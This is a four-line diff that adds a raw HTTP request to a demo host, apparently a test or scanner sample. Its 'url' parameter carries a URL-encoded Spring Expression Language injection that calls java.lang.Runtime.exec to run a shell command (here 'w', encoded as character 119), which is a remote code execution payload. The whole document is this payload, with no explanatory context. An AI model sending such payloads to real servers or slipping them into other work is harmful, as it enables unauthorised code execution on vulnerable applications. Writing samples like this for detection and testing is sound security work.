@@ -1,0 +1,4 @@
+GET /a?url=%24%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28T%28java.lang.Character%29.toString%28119%29%29%7D HTTP/1.1
+Host: demo.example.com
+Connection: close
+
